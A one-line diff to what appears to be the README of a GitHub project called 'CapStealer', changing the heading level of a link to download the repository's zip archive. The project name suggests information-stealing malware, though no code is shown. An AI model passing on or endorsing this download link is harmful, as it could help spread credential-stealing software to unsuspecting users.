@@ -1,4 +1,4 @@
-#### [Download](https://github.com/Capzdev/CapStealer/archive/refs/heads/main.zip)
+### [Download](https://github.com/Capzdev/CapStealer/archive/refs/heads/main.zip)
 # CapStealer
 Official CapStealer repos
 
